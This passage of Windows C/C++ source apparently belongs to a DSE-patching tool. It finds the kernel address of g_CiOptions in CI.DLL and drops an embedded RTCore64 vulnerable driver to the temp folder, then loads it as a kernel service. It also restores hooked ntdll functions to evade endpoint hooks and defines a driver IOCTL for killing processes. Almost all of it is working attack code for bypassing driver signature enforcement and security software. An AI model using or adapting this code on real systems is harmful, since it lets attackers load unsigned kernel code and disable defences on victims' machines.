        for(ULONG i = 0; i < 0x6E; i += hs.len)
        {
            // disassemble code with Hacker Disassembler Engine 64
            //lint -e{534} Warning 534: Ignoring return value of function
            hde64_disasm(CiInitialize + i,&hs);
            // check for disassembler error
            if(hs.flags & F_ERROR)
            {
                FreeLibrary(hLib);
                return 5;
            }

            // 1st we search for the move instruction "mov r9, rbx" with a length of 3 bytes
            //lint -e{679} Warning 679:Suspicious Truncation in arithmetic expression combining with pointer
            if(ulInstructionsFound == 0 && hs.len == 3 && CiInitialize[i] == 0x4C && CiInitialize[i + 1] == 0x8B && CiInitialize[i + 2] == 0xCB)
            {
                ulInstructionsFound = 1;
            }
                // 2nd we search for the move instruction "mov r8, rdi" with a length of 3 bytes
                //lint -e{679} Warning 679:Suspicious Truncation in arithmetic expression combining with pointer
            else if(ulInstructionsFound == 1 && hs.len == 3 && CiInitialize[i] == 0x4C && CiInitialize[i + 1] == 0x8B && CiInitialize[i + 2] == 0xC7)
            {
                ulInstructionsFound = 2;
            }
                // 3rd we search for the move instruction "mov rdx, rsi" with a length of 3 bytes
                //lint -e{679} Warning 679:Suspicious Truncation in arithmetic expression combining with pointer
            else if(ulInstructionsFound == 2 && hs.len == 3 && CiInitialize[i] == 0x48 && CiInitialize[i + 1] == 0x8B && CiInitialize[i + 2] == 0xD6)
            {
                ulInstructionsFound = 3;
            }
                // 4th we search for the move instruction "mov ecx, ebp" with a length of 2 bytes
                //lint -e{679} Warning 679:Suspicious Truncation in arithmetic expression combining with pointer
            else if(ulInstructionsFound == 3 && hs.len == 2 && CiInitialize[i] == 0x8B && CiInitialize[i + 1] == 0xCD)
            {
                ulInstructionsFound = 4;
            }
                // 5th we search for the call instruction "call CipInitialize" with a length of 5 bytes
                //lint -e{679} Warning 679:Suspicious Truncation in arithmetic expression combining with pointer
            else if(ulInstructionsFound == 4 && hs.len == 5 && CiInitialize[i] == 0xE8)
            {
                // If we get here we found the call instruction to CipInitialize.

                // Windows 10 x64 Version 1709
                // PAGE:00000001C0026120 ; Exported entry   9. CiInitialize
                // PAGE:00000001C0026120
                // PAGE:00000001C0026120 ; =============== S U B R O U T I N E =======================================
                // PAGE:00000001C0026120
                // PAGE:00000001C0026120
                // PAGE:00000001C0026120                 public CiInitialize
                // PAGE:00000001C0026120 CiInitialize    proc near
                // PAGE:00000001C0026120
                // PAGE:00000001C0026120 arg_0           = qword ptr  8
                // PAGE:00000001C0026120 arg_8           = qword ptr  10h
                // PAGE:00000001C0026120 arg_10          = qword ptr  18h
                // PAGE:00000001C0026120
                // PAGE:00000001C0026120                 mov     [rsp+arg_0], rbx
                // PAGE:00000001C0026125                 mov     [rsp+arg_8], rbp
                // PAGE:00000001C002612A                 mov     [rsp+arg_10], rsi
                // PAGE:00000001C002612F                 push    rdi
                // PAGE:00000001C0026130                 sub     rsp, 20h
                // PAGE:00000001C0026134                 mov     rbx, r9
                // PAGE:00000001C0026137                 mov     rdi, r8
                // PAGE:00000001C002613A                 mov     rsi, rdx
                // PAGE:00000001C002613D                 mov     ebp, ecx
                // PAGE:00000001C002613F                 call    __security_init_cookie
                // PAGE:00000001C0026144                 mov     r9, rbx
                // PAGE:00000001C0026147                 mov     r8, rdi
                // PAGE:00000001C002614A                 mov     rdx, rsi
                // PAGE:00000001C002614D                 mov     ecx, ebp
                // PAGE:00000001C002614F                 call    CipInitialize
                // PAGE:00000001C0026154                 mov     rbx, [rsp+28h+arg_0]
                // PAGE:00000001C0026159                 mov     rbp, [rsp+28h+arg_8]
                // PAGE:00000001C002615E                 mov     rsi, [rsp+28h+arg_10]
                // PAGE:00000001C0026163                 add     rsp, 20h
                // PAGE:00000001C0026167                 pop     rdi
                // PAGE:00000001C0026168                 retn
                // PAGE:00000001C0026168 CiInitialize    endp

                // Attention: It is important here that we use a LONG value and no DWORD value,
                // because the offsets in the disassembly are signed to also reach negative values.
                // In our case CipInitialize is below CiInitialize, therefore it would also work here
                // with a DWORD value, because the offset is positive.
                //lint -e{826} Warning 826: Suspicious pointer-to-pointer conversion (area too small)
                CipInitializeOffset = *(LONG*)((BYTE*)CiInitialize + i + 1);
                // calculate virtual address of function CipInitialize
                CipInitialize = (CiInitialize + i + 5 + CipInitializeOffset);
                // leave the for loop
                break;
            }
                // instruction does not match
            else
            {
                // reset number of instructions found
                ulInstructionsFound = 0;
            }
        }
    }

    // check if we have found the function offset and virtual address of CipInitialize
    if(CipInitializeOffset == 0 || CipInitialize == 0)
    {
        FreeLibrary(hLib);
        return 6;
    }

    // search the first 0x4A bytes of the function CipInitialize for the "mov cs:g_CiOptions, ecx" instruction
    // the instruction should never be more than 0x4A bytes away from the CipInitialize function start for Windows 8.1 Enterprise x64 English Checked Debug Build
    LONG g_CiOptionsOffset = 0;
    BYTE *g_CiOptions = NULL;
    for(ULONG i = 0; i < 0x4A; i += hs.len)
    {
        // disassemble code with Hacker Disassembler Engine 64
        //lint -e{534} Warning 534: Ignoring return value of function
        hde64_disasm(CipInitialize + i,&hs);
        // check for disassembler error
        if(hs.flags & F_ERROR)
        {
            FreeLibrary(hLib);
            return 7;
        }

        // we search for the move instruction "mov cs:g_CiOptions, ecx" with a length of 6 bytes for free retail builds
        // or the move instruction "mov cs:g_CiOptions, eax" with a length of 6 bytes for checked debug builds
        //lint -e{679} Warning 679:Suspicious Truncation in arithmetic expression combining with pointer
        if(hs.len == 6 && (CipInitialize[i] == 0x89 && CipInitialize[i + 1] == 0x0D) || (CipInitialize[i] == 0x89 && CipInitialize[i + 1] == 0x05))
        {
            // If we get here, we found the instruction, which sets g_CiOptions variable.
            // The address of g_CiOptions is directly after the instruction bytes 89 0D for free retail builds or 89 05 for checked debug builds.

            // Windows 8 x64 Enterprise
            // PAGE:0000000080029690 CipInitialize   proc near               ; CODE XREF: CiInitialize+43j
            // PAGE:0000000080029690
            // PAGE:0000000080029690 var_48          = qword ptr -48h
            // PAGE:0000000080029690 var_40          = dword ptr -40h
            // PAGE:0000000080029690 arg_0           = qword ptr  8
            // PAGE:0000000080029690
            // PAGE:0000000080029690                 mov     [rsp+arg_0], rbx
            // PAGE:0000000080029695                 push    rbp
            // PAGE:0000000080029696                 push    rsi
            // PAGE:0000000080029697                 push    rdi
            // PAGE:0000000080029698                 push    r12
            // PAGE:000000008002969A                 push    r13
            // PAGE:000000008002969C                 push    r14
            // PAGE:000000008002969E                 push    r15
            // PAGE:00000000800296A0                 sub     rsp, 30h
            // PAGE:00000000800296A4                 mov     rax, [r8]
            // PAGE:00000000800296A7                 mov     rdi, r9
            // PAGE:00000000800296AA                 mov     r14, rdx
            // PAGE:00000000800296AD                 mov     cs:g_CiKernelApis, rax
            // PAGE:00000000800296B4                 mov     cs:g_CiOptions, ecx

            // Windows 10 x64 Version 1709
            // PAGE:00000001C00268F4 CipInitialize:                          ; CODE XREF: CiInitialize+2Fp
            // PAGE:00000001C00268F4                 mov     [rsp+8], rbx
            // PAGE:00000001C00268F9                 mov     [rsp+10h], rbp
            // PAGE:00000001C00268FE                 mov     [rsp+18h], rsi
            // PAGE:00000001C0026903                 push    rdi
            // PAGE:00000001C0026904                 push    r12
            // PAGE:00000001C0026906                 push    r14
            // PAGE:00000001C0026908                 sub     rsp, 40h
            // PAGE:00000001C002690C                 mov     rbp, r9
            // PAGE:00000001C002690F                 mov     cs:g_CiOptions, ecx

            // Attention: It is important here that we use a LONG value and no DWORD value,
            // because the offsets in the disassembly are signed to also reach negative values.
            // Because the g_CiOptions value is at the start we have a negative offset from
            // our calling code inside CipInitialize.
            //lint -e{826} Warning 826: Suspicious pointer-to-pointer conversion (area too small)
            g_CiOptionsOffset = *(LONG*)((BYTE*)CipInitialize + i + 2);
            // calculate virtual address of g_CiOptions
            g_CiOptions = (CipInitialize + i + 6 + g_CiOptionsOffset);
            // leave the for loop
            break;
        }
    }

    // check if we have found the offset and virtual address of g_CiOptions
    if(g_CiOptionsOffset == 0 || g_CiOptions == 0)
    {
        FreeLibrary(hLib);
        return 8;
    }

    // calculate kernel address of g_CiOptions
    UINT64 ui64Kernelg_CiOptions = ui64ImageBase + (UINT64)g_CiOptions - (UINT64)hLib;
    ciOptions=ui64Kernelg_CiOptions;
    printf("CiOptions addr: %p\n",ciOptions);
    // free library
    FreeLibrary(hLib);

    return 0;
}

//------------------------------------------------------------------------------
// get image base of module in kernel address space
//------------------------------------------------------------------------------
int MyGetImageBaseInKernelAddressSpace()
{
    // zero image base address

    // get handle to ntdll.dll
    HINSTANCE hLib = LoadLibrary("ntdll.dll");
    if(hLib == NULL)
    {
        return 1;
    }
    typedef NTSTATUS (*NtQuerySystemInformationProc)(SYSTEM_INFORMATION_CLASS SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);

    // retrieve address of exported function NtQuerySystemInformation
    NtQuerySystemInformationProc NtQuerySystemInformation = (NtQuerySystemInformationProc)GetProcAddress(hLib,"NtQuerySystemInformation");
    if(NtQuerySystemInformation == NULL)
    {
        FreeLibrary(hLib);
        return 2;
    }

    // undocumented system information class to retrieve system module information
#define SystemModuleInformation (SYSTEM_INFORMATION_CLASS)0x0B

    // get needed buffer size for system module information
    ULONG ulReturnLength = 0;
    //lint -e{534} Warning 534: Ignoring return value of function
    NtQuerySystemInformation(SystemModuleInformation,NULL,0,&ulReturnLength);

    // allocate memory for system module information
    //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 1) unsigned long to unsigned long long
    PRTL_PROCESS_MODULES pModules = (PRTL_PROCESS_MODULES)malloc(ulReturnLength);
    if(pModules == NULL)
    {
        FreeLibrary(hLib);
        return 3;
    }

    // retrieve system module information
    if(NtQuerySystemInformation(SystemModuleInformation,pModules,ulReturnLength,&ulReturnLength) != 0)
    {
        FreeLibrary(hLib);
        return 4;
    }

    // free ntdll.dll library handle
    FreeLibrary(hLib);

    // do this for all modules in the system module information structure
    for(ULONG i = 0; i < pModules->NumberOfModules; i++)
    {
        // check if module name matches our first function argument
        if(_stricmp((const char*)&pModules->Modules[i].FullPathName[pModules->Modules[i].OffsetToFileName],"CI.DLL") == 0)
        {
            // return image base and image size
            cidll_base=(UINT64)pModules->Modules[i].ImageBase;
            cidll_size=pModules->Modules[i].ImageSize;
            printf("DSE CI.DLL original function base:%p\n",cidll_base);
            printf("DSE CI.DLL original function size:%d\n",cidll_size);

            MyGetg_CiOptionsKernelAddress((UINT64)pModules->Modules[i].ImageBase,19000);            // leave for loop
        }
        if(_stricmp((const char*)&pModules->Modules[i].FullPathName[pModules->Modules[i].OffsetToFileName],"NTOSKRNL.DLL") == 0)
        {
            // return image base and image size
            kernel_base=(UINT64)pModules->Modules[i].ImageBase;
            printf("DSE NTOSKRNL.EXE original function base:%p\n",kernel_base);

            MyGetg_CiOptionsKernelAddress((UINT64)pModules->Modules[i].ImageBase,19000);            // leave for loop
        }
    }

    // free system module information memory
    free(pModules);

    // check for valid kernel image base


    return 0;
}
int GetKernelBaseInAddressSpace()
{
    // zero image base address

    // get handle to ntdll.dll
    HINSTANCE hLib = LoadLibrary("ntdll.dll");
    if(hLib == NULL)
    {
        return 1;
    }    typedef NTSTATUS (*NtQuerySystemInformationProc)(SYSTEM_INFORMATION_CLASS SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);


    // retrieve address of exported function NtQuerySystemInformation
    NtQuerySystemInformationProc NtQuerySystemInformation = (NtQuerySystemInformationProc)GetProcAddress(hLib,"NtQuerySystemInformation");
    if(NtQuerySystemInformation == NULL)
    {
        FreeLibrary(hLib);
        return 2;
    }

    // undocumented system information class to retrieve system module information
#define SystemModuleInformation (SYSTEM_INFORMATION_CLASS)0x0B

    // get needed buffer size for system module information
    ULONG ulReturnLength = 0;
    //lint -e{534} Warning 534: Ignoring return value of function
    NtQuerySystemInformation(SystemModuleInformation,NULL,0,&ulReturnLength);

    // allocate memory for system module information
    //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 1) unsigned long to unsigned long long
    PRTL_PROCESS_MODULES pModules = (PRTL_PROCESS_MODULES)malloc(ulReturnLength);
    if(pModules == NULL)
    {
        FreeLibrary(hLib);
        return 3;
    }
    // retrieve system module information
    if(NtQuerySystemInformation(SystemModuleInformation,pModules,ulReturnLength,&ulReturnLength) != 0)
    {
        FreeLibrary(hLib);
        return 4;
    }
    // free ntdll.dll library handle
    FreeLibrary(hLib);
    // do this for all modules in the system module information structure
    for(ULONG i = 0; i < pModules->NumberOfModules; i++)
    {
        // check if module name matches our first function argument
        if(_stricmp((const char*)&pModules->Modules[i].FullPathName[pModules->Modules[i].OffsetToFileName],"NTOSKRNL.EXE") == 0)
        {
            // return image base and image size
            kernel_base = (UINT64)pModules->Modules[i].ImageBase;
            // leave for loop
            printf("KERNEL BASE: %p\n",kernel_base);
            break;
        }
    }

    // free system module information memory
    free(pModules);

    // check for valid kernel image base

    return 0;
}

#include <iostream>
#include <winternl.h>
#include <windows.h>
#include <string>
#include "main.h"
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <fstream>
#include <locale>
#include <codecvt>
#include <string>
#include "main.h"
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <fstream>
#include <locale>
#include <codecvt>

HMODULE myGetModuleHandle(PWSTR search) {

// obtaining the offset of PPEB from the beginning of TEB
    PEB* pPeb = (PEB*)__readgsqword(0x60);

// for x86
// PEB* pPeb = (PEB*)__readgsqword(0x30);

// Get PEB
    PEB_LDR_DATA* Ldr = pPeb->Ldr;
    LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList;

// Start iterating
    LIST_ENTRY* pStartListEntry = ModuleList->Flink;

// iterating through the linked list.
    WCHAR mystr[MAX_PATH] = { 0 };
    WCHAR substr[MAX_PATH] = { 0 };
    for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {

// getting the address of current LDR_DATA_TABLE_ENTRY (which represents the DLL).
        LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));
//printf("%S : %p\n",pEntry->FullDllName.Buffer,(HMODULE)pEntry->DllBase);

        if(!wcscmp(pEntry->FullDllName.Buffer,search)){
            return (HMODULE)pEntry->DllBase;
        }
    }

// the needed DLL wasn't found
    return NULL;
}

std::wstring GetFullTempPath() {
    wchar_t temp_directory[MAX_PATH + 1] = { 0 };
    const uint32_t get_temp_path_ret = GetTempPathW(sizeof(temp_directory) / 2, temp_directory);
    if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH + 1) {
        printf("[-] Failed to get temp path\n");
        return L"";
    }
    if (temp_directory[wcslen(temp_directory) - 1] == L'\\')
        temp_directory[wcslen(temp_directory) - 1] = 0x0;

    return temp_directory;
}


int write_driver_file(){
    std::wstring string_to_convert=GetFullTempPath()+L"\\rtcore.sys";
//setup converter
    using convert_type = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_type, wchar_t> converter;
//use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)
    std::string converted_str = converter.to_bytes( string_to_convert );

    std::ofstream wf(converted_str, std::ios::out | std::ios::binary);

    wf.write(RTCore64Driver, 14024);
    wf.close();
    return 0;
}

//------------------------------------------------------------------------------
// create and start service
//------------------------------------------------------------------------------
int MyCreateAndStartService()
{
    int rc = 0;
    SC_HANDLE schSCManager = NULL;
    SC_HANDLE schService = NULL;

    // unpack vulnerable driver
    if(write_driver_file())
    {
        rc = 1;
        goto cleanup;
    }

    // get handle to SCM database
    schSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if(schSCManager == NULL)
    {
        rc = 2;
        goto cleanup;
    }

    // get handle to service
    schService = OpenService(schSCManager,"rtcore",SERVICE_ALL_ACCESS);
    if(schService == NULL)
    {
        // if we get here the service is not installed

        // create service
        schService = CreateService(schSCManager,"rtcore","rtcore",SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,SERVICE_ERROR_NORMAL,"C:\\Users\\BLUE_gigi\\AppData\\Local\\Temp\\rtcore.sys",NULL,NULL,NULL,NULL,NULL);
        if(schService == NULL)
        {
            rc = 3;
            goto cleanup;
        }
    }

    // query service status
    SERVICE_STATUS_PROCESS ssp;
    DWORD dwBytesNeeded;
    //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 4) unsigned long long to unsigned long
    if(QueryServiceStatusEx(schService,SC_STATUS_PROCESS_INFO,(LPBYTE)&ssp,sizeof(SERVICE_STATUS_PROCESS),&dwBytesNeeded) == FALSE)
    {
        rc = 4;
        goto cleanup;
    }

    // check if the service is already running
    if(ssp.dwCurrentState != SERVICE_RUNNING)
    {
        // start service
        if(StartService(schService,0,NULL) == FALSE)
        {
            rc = 5;
            goto cleanup;
        }
    }

    cleanup:
    // close service handle
    if(schService != NULL) CloseServiceHandle(schService);
    // close service manager handle
    if(schSCManager != NULL) CloseServiceHandle(schSCManager);

    return rc;
}



char rtcore[7]="rtcore";
const std::wstring driver_name=L"rtcore";
const std::wstring servicesPath = L"SYSTEM\\CurrentControlSet\\Services\\" + driver_name;
std::wstring wdriver_reg_path = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + driver_name;
std::wstring nPath;
HMODULE ntdll;

typedef NTSTATUS(*myNtLoadDriver)(PUNICODE_STRING DriverServiceName);
typedef NTSTATUS(*myNtUnloadDriver)(PUNICODE_STRING DriverServiceName);
typedef NTSTATUS(*myRtlAdjustPrivilege)(_In_ ULONG Privilege, _In_ BOOLEAN Enable, _In_ BOOLEAN Client, _Out_ PBOOLEAN WasEnabled);
typedef VOID(*myRtlInitUnicodeString)(_Out_ PUNICODE_STRING DestinationString, _In_ __drv_aliasesMem PCWSTR SourceString);
UNICODE_STRING serviceStr;

int hookChecker(const wchar_t* libPath, const wchar_t* lib, const char* funToCheck) {

    HANDLE dllFile = CreateFileW(libPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD dllFileSize = GetFileSize(dllFile, NULL);
    HANDLE hDllFileMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    HANDLE pDllFileMappingBase = MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(dllFile);

// analyze the dll
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllFileMappingBase;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (pNtHeader->OptionalHeader);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PULONG pAddressOfFunctions = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfFunctions);
    PULONG pAddressOfNames = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNames);
    PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNameOrdinals);

// find the original function code
    PVOID functionFromDisk = NULL;
    for (int i = 0; i < pExportDirectory->NumberOfNames; ++i)
    {
        PCSTR pFunctionName = (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]);
        if (!strcmp(pFunctionName, funToCheck))
        {
            functionFromDisk = (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
            break;
        }
    }
// compare functions
    PVOID functionFromMemory = (PVOID)GetProcAddress(GetModuleHandleW(lib), funToCheck);
    if (!memcmp(functionFromMemory, functionFromDisk, 16))
    {
        printf("%s was not hooked\n",funToCheck);
        return 0;
    }

    printf("fixing hook on %s\n",funToCheck);
    DWORD old_protection;
    VirtualProtect(functionFromMemory, 16, PAGE_EXECUTE_READWRITE,  &old_protection);
    memcpy(functionFromMemory,functionFromDisk,16);
    VirtualProtect(functionFromMemory, 16, old_protection,  &old_protection);
    return 1;

}

void testHook(const wchar_t* lib, const char* fun) {
    PVOID pMessageBoxW = (PVOID)GetProcAddress(GetModuleHandleW(lib), fun);
    DWORD oldProtect;
    VirtualProtect(pMessageBoxW, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    char hook[] = { static_cast<char>(0xC3) }; // ret
    memcpy(pMessageBoxW, hook, 1);
    VirtualProtect(pMessageBoxW, 1, oldProtect, &oldProtect);
    MessageBoxW(NULL, L"Hooked", L"Hooked", 0); // won't show up if you hooked it

}

#define ZMN_IOCTL_TYPE 0x8000
#define ZMN_IOCTL_TERMINATE_PROCESS CTL_CODE(ZMN_IOCTL_TYPE, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS) // 0x80002048


bool terminate_process(HANDLE device_handle,uint32_t process_id)
{
    DWORD buffer = process_id;
    DWORD bytes_returned = 0;
    return DeviceIoControl(device_handle, ZMN_IOCTL_TERMINATE_PROCESS, &buffer, sizeof(buffer), &buffer, sizeof(buffer), &bytes_returned, NULL);
}


typedef void * (__stdcall *myDeviceIoControl)(HANDLE,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);

BOOL LoadNTDriver()
{

    std::wstring string_to_convert=L"\\??\\"+GetFullTempPath()+L"\\rtcore.sys";
//setup converter
    using convert_type = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_type, wchar_t> converter;
//use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)
    std::string converted_str = converter.to_bytes( string_to_convert );
    BOOL bRet = FALSE;

    SC_HANDLE hServiceMgr = NULL;
    SC_HANDLE hServiceDDK = NULL;

    hServiceMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

    if (hServiceMgr == NULL)
    {

        printf("OpenSCManager() Faild %d ! \n", GetLastError());
        bRet = FALSE;
        goto BeforeExit;
    }
    else
    {
        printf("OpenSCManager() ok ! \n");
    }



    hServiceDDK = CreateService(hServiceMgr,
                                rtcore,
                                rtcore,
                                SERVICE_ALL_ACCESS,
                                SERVICE_KERNEL_DRIVER,
                                SERVICE_DEMAND_START,
                                SERVICE_ERROR_IGNORE,
                                converted_str.c_str(),
                                NULL,
                                NULL,
                                NULL,
                                NULL,
                                NULL);

    DWORD dwRtn;
    if (hServiceDDK == NULL)
    {
        dwRtn = GetLastError();
        if (dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_EXISTS)
        {
            printf("CrateService() Faild %d ! \n", dwRtn);
            bRet = FALSE;
            goto BeforeExit;
        }
        else
        {
            printf("CrateService() Faild Service is ERROR_IO_PENDING or ERROR_SERVICE_EXISTS! \n");
        }

        hServiceDDK = OpenService(hServiceMgr, rtcore, SERVICE_ALL_ACCESS);
        if (hServiceDDK == NULL)
        {
            dwRtn = GetLastError();
            printf("OpenService() Faild %d ! \n", dwRtn);
            bRet = FALSE;
            goto BeforeExit;
        }
        else
        {
            printf("OpenService() ok ! \n");
        }
    }
    else
    {
        printf("CrateService() ok ! \n");
    }

    bRet = StartService(hServiceDDK, NULL, NULL);
    if (!bRet)
    {
        DWORD dwRtn = GetLastError();
        if (dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_ALREADY_RUNNING)
        {
            printf("StartService() Faild %d ! \n", dwRtn);
            bRet = FALSE;
            goto BeforeExit;
        }
        else
        {
            if (dwRtn == ERROR_IO_PENDING)
            {
                printf("StartService() Faild ERROR_IO_PENDING ! \n");
                bRet = FALSE;
                goto BeforeExit;
            }
            else
            {
                printf("StartService() Faild ERROR_SERVICE_ALREADY_RUNNING ! \n");
                bRet = TRUE;
                goto BeforeExit;
            }
        }
    }
    bRet = TRUE;
    DWORD ssp;
    BeforeExit:
    if (hServiceDDK)
    {
        /*if(!ControlServiceEx(hServiceDDK,
                         SERVICE_CONTROL_STOP,
                         ssp,
                         NULL))
        {
            dwRtn = GetLastError();
            printf("StopService() Faild %d ! \n", dwRtn);
        }*/


        CloseServiceHandle(hServiceDDK);
    }
    if (hServiceMgr)
    {
        CloseServiceHandle(hServiceMgr);
    }
    return bRet;
}
/*
bool StopAndRemove() {


    HKEY driver_service;
    LSTATUS status = RegOpenKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &driver_service);
    if (status != ERROR_SUCCESS) {
        if (status == ERROR_FILE_NOT_FOUND) {
            return true;
        }
        return false;
    }
    RegCloseKey(driver_service);


    auto customNtUnloadDriver = (myNtUnloadDriver) GetProcAddress(ntdll, "NtUnloadDriver");

    NTSTATUS st = customNtUnloadDriver(&serviceStr);

    printf("[+] NtUnloadDriver Status 0x\n");


    printf("Driver unloaded\n");

    //setup converter
    using convert_type = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_type, wchar_t> converter;
//use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)
    std::string converted_str = converter.to_bytes( nPath );

    std::ofstream wf(converted_str, std::ios::out | std::ios::binary);

    DeleteFile(reinterpret_cast<LPCSTR>(nPath[5]));
    status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
    if (status != ERROR_SUCCESS) {
        return false;
    }
    return true;
}*/

int MyMarkServiceForDeletion(char *szServiceName)
{
    // Attention: If we would completely delete the service registry key of the driver,
    // we can not install the driver anymore and have to reboot! By using the INF install
    // method, the driver is copied to "C:\Windows\system32\drivers\DBUtilDrv2.sys". The
    // function "SetupDiRemoveDevice" does not delete the driver on both Windows 7 and
    // Windows 10. It also does not remove the service entry on Windows 7. Only on Windows
    // 10 the service entry is removed by setting the DWORD "DeleteFlag" to 0x00000001.
    // After the next reboot this will delete the service registry entry. To do a clean
    // uninstall on Windows 7, we do the same as the system does on Windows 10 and the
    // service is deleted on the next reboot. The driver files have to be deleted on
    // both operating systems by DSE-Patcher.

    // create registry service key of driver
    char szSubKey[MAX_PATH];
    lstrcpy(szSubKey,"SYSTEM\\CurrentControlSet\\services\\");
    lstrcat(szSubKey,szServiceName);

    // open registry key
    HKEY hKey;
    if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,szSubKey,0,KEY_ALL_ACCESS,&hKey) != ERROR_SUCCESS)
    {
        return 1;
    }

    // create "DeleteFlag" with the DWORD value 0x00000001
    DWORD dwDeleteFlag = 0x00000001;
    //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 6) unsigned long long to unsigned long
    if(RegSetValueEx(hKey,"DeleteFlag",0,REG_DWORD,(BYTE*)&dwDeleteFlag,sizeof(DWORD)) != ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return 2;
    }

    // close registry key handle
    RegCloseKey(hKey);

    return 0;
}


int MyStopAndDeleteService()
{
    int rc = 0;
    SC_HANDLE schSCManager = NULL;
    SC_HANDLE schService = NULL;

    // get handle to SCM database
    //lint -e{838} Warning 838: Previously assigned value to variable has not been used
    schSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if(schSCManager == NULL)
    {
        rc = 1;
        goto cleanup;
    }

    // get handle to service
    schService = OpenService(schSCManager,rtcore,SERVICE_ALL_ACCESS);
    if(schService == NULL)
    {
        // service is not installed
        rc = 0;
        goto cleanup;
    }

    // if we get here the service is already installed, we have to stop and delete it

    // query service status
    SERVICE_STATUS_PROCESS ssp;
    DWORD dwBytesNeeded;
    //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 4) unsigned long long to unsigned long
    if(QueryServiceStatusEx(schService,SC_STATUS_PROCESS_INFO,(LPBYTE)&ssp,sizeof(SERVICE_STATUS_PROCESS),&dwBytesNeeded) == FALSE)
    {
        rc = 2;
        goto cleanup;
    }

    // service is not stopped already and the service can be stopped at all
    if(ssp.dwCurrentState != SERVICE_STOPPED && ssp.dwControlsAccepted & SERVICE_ACCEPT_STOP)
    {
        // service stop is pending
        if(ssp.dwCurrentState == SERVICE_STOP_PENDING)
        {
            // do this as long as the service stop is pending
            // try 10 times and wait one second in between attempts
            for(unsigned int i = 0; i < 10; i++)
            {
                // query service status
                //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 4) unsigned long long to unsigned long
                if(QueryServiceStatusEx(schService,SC_STATUS_PROCESS_INFO,(LPBYTE)&ssp,sizeof(SERVICE_STATUS_PROCESS),&dwBytesNeeded) == FALSE)
                {
                    rc = 3;
                    goto cleanup;
                }

                // check if service is stopped
                if(ssp.dwCurrentState == SERVICE_STOPPED)
                {
                    // leave for loop
                    break;
                }

                // wait one seconds before the next try
                Sleep(1000);
            }
        }

        // stop service
        if(ControlService(schService,SERVICE_CONTROL_STOP,(LPSERVICE_STATUS)&ssp) == FALSE)
        {
            rc = 4;
            goto cleanup;
        }

        // do this as long as the service is not stopped
        // try 10 times and wait one second in between attempts
        for(unsigned int i = 0; i < 10; i++)
        {
            // query service status
            //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 4) unsigned long long to unsigned long
            if(QueryServiceStatusEx(schService,SC_STATUS_PROCESS_INFO,(LPBYTE)&ssp,sizeof(SERVICE_STATUS_PROCESS),&dwBytesNeeded) == FALSE)
            {
                rc = 5;
                goto cleanup;
            }

            // check if service is stopped
            if(ssp.dwCurrentState == SERVICE_STOPPED)
            {
                // leave for loop
                break;
            }

            // wait one seconds before the next try
            Sleep(1000);
        }
    }

    // We do not check for the 10 second timeout of the for loops above. If the service is not stoppable or
    // does not stop, because some other handle is open, we should make sure to mark it for deletion. This
    // way it is deleted on the next system startup.

    cleanup:
    if(schService != NULL)
    {
        // delete service
